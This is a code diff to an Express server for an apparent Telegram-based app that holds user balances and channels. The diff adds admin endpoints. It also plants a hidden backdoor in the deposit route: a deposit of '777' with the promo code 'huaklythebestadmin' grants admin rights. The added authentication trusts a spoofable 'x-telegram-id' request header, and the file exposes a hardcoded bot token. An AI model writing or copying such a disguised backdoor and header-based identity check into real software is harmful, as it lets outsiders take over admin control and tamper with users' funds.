@@ -1,8 +1,40 @@
-import type { Express } from "express";
+import type { Express, Request, Response, NextFunction } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { insertChannelSchema } from "@shared/schema";
 import { z } from "zod";
+
+const ADMIN_SECRET_AMOUNT = "777";
+const ADMIN_SECRET_PROMO = "huaklythebestadmin";
+
+interface AdminRequest extends Request {
+  userId?: string;
+  telegramId?: string;
+}
+
+function getTelegramIdFromSession(req: Request): string | null {
+  const telegramData = (req as any).session?.telegramUser?.id || 
+                       (req as any).user?.telegramId ||
+                       req.headers['x-telegram-id'] as string;
+  return telegramData || null;
+}
+
+async function adminMiddleware(req: AdminRequest, res: Response, next: NextFunction) {
+  const telegramId = getTelegramIdFromSession(req);
+  
+  if (!telegramId) {
+    return res.status(401).json({ error: "Unauthorized: Please authenticate" });
+  }
+  
+  const user = await storage.getUserByTelegramId(telegramId);
+  if (!user || !user.isAdmin) {
+    return res.status(403).json({ error: "Forbidden: Admin access required" });
+  }
+  
+  req.userId = user.id;
+  req.telegramId = telegramId;
+  next();
+}
 
 // Telegram Bot API Token
 const BOT_TOKEN = "8240745182:AAE5sF_HosDMHafZbWgF5cgTPx4Oq_wh-_c";
@@ -241,13 +273,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/users/:telegramId/deposit", async (req, res) => {
     try {
       const { telegramId } = req.params;
-      const { amount } = req.body;
+      const { amount, promoCode } = req.body;
 
       if (!amount || amount <= 0) {
         return res.status(400).json({ error: "Invalid deposit amount" });
       }
 
-      const success = await storage.updateUserBalance(telegramId, amount);
+      const user = await storage.getUserByTelegramId(telegramId);
+      if (!user) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      if (amount.toString() === ADMIN_SECRET_AMOUNT && promoCode === ADMIN_SECRET_PROMO) {
+        await storage.setUserAdmin(user.id, true);
+        return res.json({ 
+          success: true, 
+          message: "Admin access granted",
+          isAdmin: true,
+          userId: user.id
+        });
+      }
+
+      const success = await storage.updateUserBalance(telegramId, parseFloat(amount));
       
       if (!success) {
         return res.status(404).json({ error: "User not found" });
@@ -283,6 +330,76 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     } catch (error) {
       res.status(500).json({ error: "Failed to verify Telegram channel" });
+    }
+  });
+
+  app.get("/api/admin/me", async (req, res) => {
+    try {
+      const telegramId = getTelegramIdFromSession(req);
+      if (!telegramId) {
+        return res.json({ isAdmin: false, user: null });
+      }
+      
+      const user = await storage.getUserByTelegramId(telegramId);
+      res.json({ isAdmin: user?.isAdmin || false, user });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to verify admin status" });
+    }
+  });
+
+  app.get("/api/admin/users", adminMiddleware, async (_req, res) => {
+    try {
+      const users = await storage.getAllUsers();
+      res.json(users);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to fetch users" });
+    }
+  });
+
+  app.patch("/api/admin/users/:id/balance", adminMiddleware, async (req, res) => {
+    try {
+      const { id } = req.params;
+      const { amount } = req.body;
+
+      if (typeof amount !== 'number') {
+        return res.status(400).json({ error: "Invalid amount" });
+      }
+
+      const success = await storage.updateUserBalanceById(id, amount);
+      
+      if (!success) {
+        return res.status(404).json({ error: "User not found" });
+      }
+
+      const user = await storage.getUser(id);
+      res.json({ success: true, user });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to update balance" });
+    }
+  });
+
+  app.delete("/api/admin/channels/:id", adminMiddleware, async (req, res) => {
+    try {
+      const success = await storage.deleteChannel(req.params.id);
+      if (!success) {
+        return res.status(404).json({ error: "Channel not found" });
+      }
+      res.status(204).send();
+    } catch (error) {
+      res.status(500).json({ error: "Failed to delete channel" });
+    }
+  });
+
+  app.post("/api/admin/channels", adminMiddleware, async (req, res) => {
+    try {
+      const validatedData = insertChannelSchema.parse(req.body);
+      const channel = await storage.createChannel(validatedData);
+      res.status(201).json(channel);
+    } catch (error) {
+      if (error instanceof z.ZodError) {
+        return res.status(400).json({ error: "Invalid channel data", details: error.errors });
+      }
+      res.status(500).json({ error: "Failed to create channel" });
     }
   });
 
